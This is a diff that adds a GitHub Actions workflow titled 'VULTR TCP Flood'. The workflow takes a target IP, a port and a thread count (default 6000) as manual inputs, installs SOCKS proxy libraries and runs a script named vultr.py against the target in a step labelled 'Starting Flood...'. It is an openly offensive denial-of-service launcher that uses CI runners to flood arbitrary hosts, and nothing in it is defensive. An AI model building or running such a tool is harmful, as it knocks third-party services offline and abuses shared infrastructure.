@@ -1,0 +1,35 @@
+name: VULTR TCP Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+      portgt:
+        description: "Port Target"
+        required: true
+        default: "80"
+      thread:
+        description: "Threads"
+        required: true
+        default: "6000"
+      
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install socks pysocks
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        python vultr.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }}
